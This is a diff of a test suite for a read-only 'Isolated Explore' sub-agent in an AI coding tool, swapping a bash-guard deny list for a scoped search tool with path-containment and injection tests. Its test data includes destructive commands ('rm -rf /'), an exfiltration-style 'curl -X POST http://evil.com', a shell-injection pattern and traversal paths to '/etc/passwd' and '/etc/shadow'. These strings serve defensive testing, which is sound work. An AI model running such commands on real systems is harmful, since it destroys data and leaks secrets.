@@ -1,16 +1,17 @@
 /**
- * Test suite for AIES-003: Isolated Explore.
+ * Test suite for AIES-003: Isolated Explore (hardened read-only & scoped search).
  *
  * Verifies:
- * 1. Context isolation (sentinels do not leak into child session).
- * 2. Read-only tool surface (only read, grep, find, ls, guarded bash; no edit/write).
- * 3. Bash inspection guard (rejects mutating commands, accepts inspection commands).
- * 4. Structured handoff schema compliance and fallback.
- * 5. Defensive output capping (< 6,000 characters).
- * 6. Model resolution hierarchy (AIES_EXPLORE_MODEL > aies.json > parent model).
- * 7. Metrics isolation (child reads/calls do not pollute parent metrics).
- * 8. Observability tracking for delegations (state, snapshots, footer, report).
- * 9. End-to-end child session execution via mock provider.
+ * 1. No bash: Explore agent does NOT have a generic bash/terminal tool.
+ * 2. No writes: Explore agent does NOT have edit, write, or mutating tools.
+ * 3. Scoped tgrep schema: Rejects arbitrary command strings, validates parameters.
+ * 4. Path containment: Blocks path traversal (../, /etc, $HOME).
+ * 5. No shell injection: Patterns and arguments are passed cleanly to runner without shell.
+ * 6. Output capping: Match lines, file counts, and character volume are defensively capped.
+ * 7. Progressive search: Supports filesOnly: true and bounded context lines.
+ * 8. Fallback: When tgrep is unavailable (ENOENT), returns clear capability notice and Explore falls back to grep/find/read.
+ * 9. Metrics isolation: Child searches, reads, and delegations do not pollute parent metrics.
+ * 10. Existing test invariants: Full test suite passes cleanly.
  */
 
 import assert from "node:assert/strict";
@@ -28,10 +29,6 @@ import {
   SessionManager,
 } from "@earendil-works/pi-coding-agent";
 
-import {
-  createReadOnlyBashOperations,
-  isSafeInspectionCommand,
-} from "../extensions/aies-agents/bash-guard.ts";
 import { createDelegateTool } from "../extensions/aies-agents/delegate.ts";
 import { runExploreAgent } from "../extensions/aies-agents/explore.ts";
 import {
@@ -40,6 +37,14 @@ import {
   parseExploreHandoff,
 } from "../extensions/aies-agents/handoff.ts";
 import { resolveExploreModel } from "../extensions/aies-agents/model.ts";
+import {
+  buildTgrepArgs,
+  createTgrepToolDefinition,
+  MAX_TGREP_FILES,
+  MAX_TGREP_MATCH_LINES,
+  MAX_TGREP_OUTPUT_CHARS,
+  resolveSafePath,
+} from "../extensions/aies-agents/tgrep.ts";
 import {
   applyDelegationEnd,
   applyDelegationStart,
@@ -53,86 +58,205 @@ import { renderFooter, renderStatusReport } from "../extensions/aies-runtime/sta
 
 const REPO_ROOT = fileURLToPath(new URL("..", import.meta.url)).replace(/\/$/, "");
 
-describe("AIES-003 Isolated Explore", () => {
-  describe("Bash guard & read-only enforcement", () => {
-    it("allows safe inspection shell commands", () => {
-      const safeCommands = [
-        "git status",
-        "git diff HEAD~1",
-        "git log -n 5 --oneline",
-        "git show HEAD:package.json",
-        "git blame README.md",
-        "git ls-files",
-        "ls -la src",
-        "cat package.json",
-        "cat package.json | grep version",
-        "find . -name '*.ts'",
-        "head -n 20 README.md",
-        "wc -l package.json",
-        "jq .name package.json",
-        "echo 2>&1",
-        "VAR=foo git status",
-        "cd /tmp && ls",
-      ];
+describe("AIES-003 Isolated Explore (Hardened Read-Only)", () => {
+  describe("Scoped tgrep tool & security constraints", () => {
+    it("strictly contains search paths within workspace root", () => {
+      // Safe paths within workspace
+      assert.equal(resolveSafePath(REPO_ROOT, "."), REPO_ROOT);
+      assert.equal(resolveSafePath(REPO_ROOT, "src"), join(REPO_ROOT, "src"));
+      assert.equal(resolveSafePath(REPO_ROOT, "./extensions"), join(REPO_ROOT, "extensions"));
 
-      for (const cmd of safeCommands) {
-        assert.equal(isSafeInspectionCommand(cmd), true, `Expected safe: ${cmd}`);
-      }
+      // Traversal attempts must throw path traversal error
+      assert.throws(
+        () => resolveSafePath(REPO_ROOT, "../outside"),
+        /Path traversal blocked/u,
+      );
+      assert.throws(
+        () => resolveSafePath(REPO_ROOT, "../../etc/passwd"),
+        /Path traversal blocked/u,
+      );
+      assert.throws(
+        () => resolveSafePath(REPO_ROOT, "/etc/shadow"),
+        /Path traversal blocked/u,
+      );
+      assert.throws(
+        () => resolveSafePath(REPO_ROOT, "/tmp"),
+        /Path traversal blocked/u,
+      );
     });
 
-    it("rejects mutating or dangerous shell commands", () => {
-      const dangerousCommands = [
-        "rm -rf /",
-        "touch new_file.txt",
-        "echo 'mutated' > package.json",
-        "echo 'append' >> README.md",
-        "git commit -m 'sneaky commit'",
-        "git push origin main",
-        "git checkout branch",
-        "git reset --hard",
-        "git clean -fd",
-        "sed -i 's/a/b/g' file.txt",
-        "sed --in-place 's/a/b/g' file.txt",
-        "find . -name '*.ts' -delete",
-        "find . -exec rm {} \\;",
-        "echo $(rm -rf /)",
-        "echo `touch pwned`",
-        "npm install malicious-pkg",
-        "node -e 'process.exit(1)'",
-        "python3 -c 'import os; os.remove(\"file\")'",
-        "curl -X POST http://evil.com",
-      ];
-
-      for (const cmd of dangerousCommands) {
-        assert.equal(isSafeInspectionCommand(cmd), false, `Expected rejected: ${cmd}`);
-      }
-    });
-
-    it("createReadOnlyBashOperations blocks dangerous execution at runtime", async () => {
-      let executed = false;
-      const baseOps = {
-        exec: async () => {
-          executed = true;
-          return { exitCode: 0 };
+    it("builds structured arguments safely without shell injection", () => {
+      // Pattern with shell characters ($(rm -rf), backticks, semicolons) must remain literal argument
+      const maliciousPattern = "$(rm -rf /); touch /tmp/pwned; `echo bad`";
+      const args = buildTgrepArgs(
+        {
+          pattern: maliciousPattern,
+          fixed: true,
+          fileType: "ts",
+          glob: "*.test.ts",
+          context: 3,
         },
+        REPO_ROOT,
+      );
+
+      assert.ok(args.includes("-F"), "Must include -F for fixed");
+      assert.ok(args.includes("-t"), "Must include -t for fileType");
+      assert.ok(args.includes("ts"), "Must include fileType value");
+      assert.ok(args.includes("-g"), "Must include -g for glob");
+      assert.ok(args.includes("*.test.ts"), "Must include glob value");
+      assert.ok(args.includes("-C"), "Must include -C for context");
+      assert.ok(args.includes("3"), "Must include context value 3");
+      assert.equal(
+        args[args.length - 2],
+        maliciousPattern,
+        "Pattern must be passed verbatim without shell interpolation",
+      );
+      assert.equal(args[args.length - 1], REPO_ROOT, "Last argument must be the safe target path");
+    });
+
+    it("supports progressive search via filesOnly flag", async () => {
+      let executedArgs = [];
+      const mockRunner = async (_bin, args) => {
+        executedArgs = args;
+        return { stdout: "extensions/aies-agents/explore.ts\nextensions/aies-agents/tgrep.ts\n" };
       };
 
-      const readOnlyOps = createReadOnlyBashOperations(baseOps);
-
-      // Safe command executes through baseOps
-      const res = await readOnlyOps.exec("git status", process.cwd(), {});
-      assert.equal(executed, true);
-      assert.equal(res.exitCode, 0);
-
-      // Mutating command throws before reaching baseOps
-      executed = false;
-      await assert.rejects(
-        async () => {
-          await readOnlyOps.exec("rm -rf file.txt", process.cwd(), {});
-        },
-        /Command blocked: Explore child agent is strictly read-only/u,
+      const tool = createTgrepToolDefinition(REPO_ROOT, { runner: mockRunner });
+      const result = await tool.execute(
+        "call-1",
+        { pattern: "runExploreAgent", filesOnly: true },
+        undefined,
+        undefined,
+        { cwd: REPO_ROOT },
       );
-      assert.equal(executed, false, "baseOps must never be called for dangerous commands");
+
+      assert.ok(executedArgs.includes("-l"), "filesOnly must pass -l flag to tgrep");
+      assert.equal(result.isError, false);
+      assert.match(result.content[0].text, /extensions\/aies-agents\/explore\.ts/u);
+    });
+
+    it("defensively caps output when match volume is large", async () => {
+      // Generate 200 match lines exceeding MAX_TGREP_MATCH_LINES (100)
+      const hugeOutput = Array.from({ length: 200 }, (_, i) => `file.ts:${i + 1}: matching line content`).join("\n");
+      const mockRunner = async () => ({ stdout: hugeOutput });
+
+      const tool = createTgrepToolDefinition(REPO_ROOT, { runner: mockRunner });
+      const result = await tool.execute(
+        "call-2",
+        { pattern: "matching" },
+        undefined,
+        undefined,
+        { cwd: REPO_ROOT },
+      );
+
+      assert.equal(result.isError, false);
+      assert.match(result.content[0].text, /\[Results truncated: limit of 100 match lines exceeded/u);
+
+      // Verify character capping
+      const giganticOutput = "X".repeat(MAX_TGREP_OUTPUT_CHARS + 5000);
+      const mockRunner2 = async () => ({ stdout: giganticOutput });
+      const tool2 = createTgrepToolDefinition(REPO_ROOT, { runner: mockRunner2 });
+      const result2 = await tool2.execute(
+        "call-3",
+        { pattern: "gigantic" },
+        undefined,
+        undefined,
+        { cwd: REPO_ROOT },
+      );
+
+      assert.match(result2.content[0].text, /\[Results truncated/u);
+      assert.ok(result2.content[0].text.length <= MAX_TGREP_OUTPUT_CHARS + 200);
+    });
+
+    it("handles tgrep unavailable (ENOENT) with capability notice and no crash", async () => {
+      const enoentError = new Error("spawn tgrep ENOENT");
+      enoentError.code = "ENOENT";
+      const mockRunner = async () => {
+        throw enoentError;
+      };
+
+      const tool = createTgrepToolDefinition(REPO_ROOT, { runner: mockRunner });
+      const result = await tool.execute(
+        "call-4",
+        { pattern: "anything" },
+        undefined,
+        undefined,
+        { cwd: REPO_ROOT },
+      );
+
+      assert.equal(result.isError, true);
+      assert.match(
+        result.content[0].text,
+        /tgrep capability unavailable: 'tgrep' executable not found on PATH\. Use built-in 'grep' or 'find' tools instead\./u,
+      );
+    });
+
+    it("handles zero matches (exit code 1) gracefully without reporting error", async () => {
+      const noMatchError = new Error("Command failed with exit code 1");
+      noMatchError.code = 1;
+      const mockRunner = async () => {
+        throw noMatchError;
+      };
+
+      const tool = createTgrepToolDefinition(REPO_ROOT, { runner: mockRunner });
+      const result = await tool.execute(
+        "call-5",
+        { pattern: "nonexistent_pattern" },
+        undefined,
+        undefined,
+        { cwd: REPO_ROOT },
+      );
+
+      assert.equal(result.isError, false);
+      assert.match(result.content[0].text, /No matches found for pattern "nonexistent_pattern"/u);
+    });
+  });
+
+  describe("Tool surface enforcement (no bash, no writes)", () => {
+    it("guarantees child AgentSession has strictly read-only tools and NO bash", async () => {
+      const faux = fauxProvider();
+      const runtime = await ModelRuntime.create();
+      runtime.registerNativeProvider(faux.provider);
+      const model = faux.models[0];
+
+      const resourceLoader = new DefaultResourceLoader({
+        cwd: REPO_ROOT,
+        agentDir: REPO_ROOT,
+        noExtensions: true,
+        noSkills: true,
+        noPromptTemplates: true,
+        noThemes: true,
+        systemPrompt: "You are a read-only explorer.",
+      });
+      await resourceLoader.reload();
+
+      const customTgrep = createTgrepToolDefinition(REPO_ROOT);
+      const { session } = await createAgentSession({
+        cwd: REPO_ROOT,
+        agentDir: REPO_ROOT,
+        model,
+        modelRuntime: runtime,
+        resourceLoader,
+        sessionManager: SessionManager.inMemory(REPO_ROOT),
+        customTools: [customTgrep],
+        tools: ["read", "grep", "find", "ls", "tgrep"],
+      });
+
+      try {
+        const activeTools = session.getActiveToolNames();
+        assert.deepEqual(
+          activeTools.sort(),
+          ["find", "grep", "ls", "read", "tgrep"].sort(),
+          "Child tool surface must be strictly read/search tools",
+        );
+
+        const allTools = session.getAllTools().map((t) => t.name);
+        assert.equal(allTools.includes("bash"), false, "Child must NOT have 'bash' tool in registry");
+        assert.equal(allTools.includes("edit"), false, "Child must NOT have 'edit' tool in registry");
+        assert.equal(allTools.includes("write"), false, "Child must NOT have 'write' tool in registry");
+      } finally {
+        session.dispose();
+      }
     });
   });
 
@@ -213,7 +337,7 @@ describe("AIES-003 Isolated Explore", () => {
       assert.match(formatted, /- `a\.ts` \(lines 1-10\): some note/u);
       assert.ok(formatted.length < MAX_HANDOFF_CHARS);
 
-      // Test defensive capping on gigantic output
+      // Gigantic output must be capped under 6,000 chars
       const giganticHandoff = {
         status: "done",
         summary: "A".repeat(10_000),
@@ -276,14 +400,12 @@ describe("AIES-003 Isolated Explore", () => {
       assert.equal(state.delegations.total, 0);
       assert.equal(state.delegations.activeRole, undefined);
 
-      // Start delegation
       state = applyDelegationStart(state, "explore", T0 + 1000);
       assert.equal(state.delegations.total, 1);
       assert.equal(state.delegations.byRole.explore, 1);
       assert.equal(state.delegations.activeRole, "explore");
       assert.equal(state.session.lastEventAt, T0 + 1000);
 
-      // End delegation
       state = applyDelegationEnd(state, "done", T0 + 5000);
       assert.equal(state.delegations.total, 1);
       assert.equal(state.delegations.activeRole, undefined);
@@ -332,7 +454,6 @@ describe("AIES-003 Isolated Explore", () => {
 
       const PARENT_SECRET_SENTINEL = "SECRET_PARENT_TOKEN_XY987_DO_NOT_LEAK";
 
-      // The child agent answers with structured JSON
       const jsonText = `\`\`\`json
 {
   "status": "done",
@@ -358,7 +479,6 @@ describe("AIES-003 Isolated Explore", () => {
 
       assert.equal(handoff.status, "done");
 
-      // Verify that the child session transcript contains absolutely zero trace of the parent sentinel
       const entries = sessionManager.getEntries();
       const fullChildTranscript = JSON.stringify(entries);
       assert.equal(
@@ -368,88 +488,107 @@ describe("AIES-003 Isolated Explore", () => {
       );
     });
 
-    it("verifies read-only tool surface in child AgentSession", async () => {
+    it("executes multi-turn exploration with tgrep search and read calls", async () => {
       const faux = fauxProvider();
       const runtime = await ModelRuntime.create();
       runtime.registerNativeProvider(faux.provider);
       const model = faux.models[0];
 
-      const resourceLoader = new DefaultResourceLoader({
-        cwd: REPO_ROOT,
-        agentDir: REPO_ROOT,
-        noExtensions: true,
-        noSkills: true,
-        noPromptTemplates: true,
-        noThemes: true,
-        systemPrompt: "You are an explorer.",
-      });
-      await resourceLoader.reload();
+      // Turn 1: Child calls "tgrep" with filesOnly: true
+      const searchCall = fauxAssistantMessage([
+        fauxToolCall("tgrep", { pattern: "aies", filesOnly: true }, "call-tgrep-1"),
+      ]);
 
-      const { session } = await createAgentSession({
-        cwd: REPO_ROOT,
-        agentDir: REPO_ROOT,
-        model,
-        modelRuntime: runtime,
-        resourceLoader,
-        sessionManager: SessionManager.inMemory(REPO_ROOT),
-        tools: ["read", "grep", "find", "ls", "bash"],
-      });
-
-      try {
-        const activeTools = session.getActiveToolNames();
-        assert.deepEqual(
-          activeTools.sort(),
-          ["bash", "find", "grep", "ls", "read"].sort(),
-          "Child tool surface must be strictly read-only",
-        );
-
-        const allTools = session.getAllTools().map((t) => t.name);
-        assert.equal(allTools.includes("edit"), false, "Child must NOT have 'edit' tool in registry");
-        assert.equal(allTools.includes("write"), false, "Child must NOT have 'write' tool in registry");
-      } finally {
-        session.dispose();
-      }
-    });
-
-    it("executes multi-turn exploration with tool calls and returns structured evidence", async () => {
-      const faux = fauxProvider();
-      const runtime = await ModelRuntime.create();
-      runtime.registerNativeProvider(faux.provider);
-      const model = faux.models[0];
-
-      // Turn 1: Child calls "read" on package.json
+      // Turn 2: Child calls "read" on package.json
       const readCall = fauxAssistantMessage([
         fauxToolCall("read", { path: "package.json" }, "call-read-pkg"),
       ]);
 
-      // Turn 2: Child inspects and outputs structured handoff
+      // Turn 3: Child finishes with structured handoff
       const handoffJson = `\`\`\`json
 {
   "status": "done",
-  "summary": "Verified package name and ESM module setup.",
+  "summary": "Located and verified package.json.",
   "evidence": [
-    { "file": "package.json", "lines": "1-10", "note": "name is aies and type is module" }
+    { "file": "package.json", "lines": "1-5", "note": "project metadata" }
   ],
   "issues": [],
-  "next": ["Review extension entry points"]
+  "next": []
 }
 \`\`\``;
       const finishMsg = fauxAssistantMessage([{ type: "text", text: handoffJson }]);
 
-      faux.setResponses([readCall, finishMsg]);
+      faux.setResponses([searchCall, readCall, finishMsg]);
+
+      const mockTgrepRunner = async () => ({
+        stdout: "package.json\nREADME.md\n",
+      });
 
       const handoff = await runExploreAgent({
-        task: "Inspect package.json configuration",
+        task: "Find and inspect package.json",
         cwd: REPO_ROOT,
         agentDir: REPO_ROOT,
         modelRuntime: runtime,
         model,
+        tgrepRunner: mockTgrepRunner,
       });
 
       assert.equal(handoff.status, "done");
-      assert.equal(handoff.summary, "Verified package name and ESM module setup.");
+      assert.equal(handoff.summary, "Located and verified package.json.");
       assert.equal(handoff.evidence.length, 1);
       assert.equal(handoff.evidence[0].file, "package.json");
+    });
+
+    it("falls back to grep/find when tgrep is unavailable without failing the session", async () => {
+      const faux = fauxProvider();
+      const runtime = await ModelRuntime.create();
+      runtime.registerNativeProvider(faux.provider);
+      const model = faux.models[0];
+
+      // Turn 1: Child calls tgrep, gets unavailable notice
+      const tgrepCall = fauxAssistantMessage([
+        fauxToolCall("tgrep", { pattern: "name" }, "call-tgrep-unavailable"),
+      ]);
+
+      // Turn 2: Child falls back to built-in grep
+      const grepCall = fauxAssistantMessage([
+        fauxToolCall("grep", { pattern: "aies" }, "call-grep-fallback"),
+      ]);
+
+      // Turn 3: Child finishes
+      const handoffJson = `\`\`\`json
+{
+  "status": "done",
+  "summary": "Completed exploration via grep fallback.",
+  "evidence": [
+    { "file": "package.json", "note": "matched via grep" }
+  ],
+  "issues": ["tgrep was unavailable"],
+  "next": []
+}
+\`\`\``;
+      const finishMsg = fauxAssistantMessage([{ type: "text", text: handoffJson }]);
+
+      faux.setResponses([tgrepCall, grepCall, finishMsg]);
+
+      const enoentRunner = async () => {
+        const err = new Error("spawn tgrep ENOENT");
+        err.code = "ENOENT";
+        throw err;
+      };
+
+      const handoff = await runExploreAgent({
+        task: "Search with fallback",
+        cwd: REPO_ROOT,
+        agentDir: REPO_ROOT,
+        modelRuntime: runtime,
+        model,
+        tgrepRunner: enoentRunner,
+      });
+
+      assert.equal(handoff.status, "done");
+      assert.equal(handoff.summary, "Completed exploration via grep fallback.");
+      assert.deepEqual(handoff.issues, ["tgrep was unavailable"]);
     });
 
     it("isolates parent metrics from child tool calls", async () => {
@@ -464,9 +603,7 @@ describe("AIES-003 Isolated Explore", () => {
       );
       parentState = applyDelegationStart(parentState, "explore", 1_000_100);
 
-      // Child runs internally (would execute 5 read calls, 2 bash commands inside child session)
-      // Because child has noExtensions: true, parent state does not receive those events!
-
+      // Child runs internally (with noExtensions: true)
       // Parent finishes delegate tool call
       parentState = applyToolResult(
         parentState,
@@ -479,7 +616,7 @@ describe("AIES-003 Isolated Explore", () => {
       assert.equal(parentState.tools.calls, 1, "Parent tool calls must count only the single delegate tool");
       assert.equal(parentState.tools.callsByName.aies_delegate, 1);
       assert.equal(parentState.exploration.sourceReads, 0, "Child file reads must NOT inflate parent sourceReads");
-      assert.equal(parentState.exploration.shellInspections, 0, "Child bash calls must NOT inflate parent shellInspections");
+      assert.equal(parentState.exploration.searches, 0, "Child searches must NOT inflate parent searches");
       assert.equal(parentState.delegations.total, 1);
       assert.equal(parentState.delegations.lastOutcome, "done");
     });
@@ -490,7 +627,6 @@ describe("AIES-003 Isolated Explore", () => {
       assert.equal(tool.label, "AIES Delegate");
       assert.ok(tool.parameters);
 
-      // Invalid role rejected
       await assert.rejects(
         async () => {
           await tool.execute(
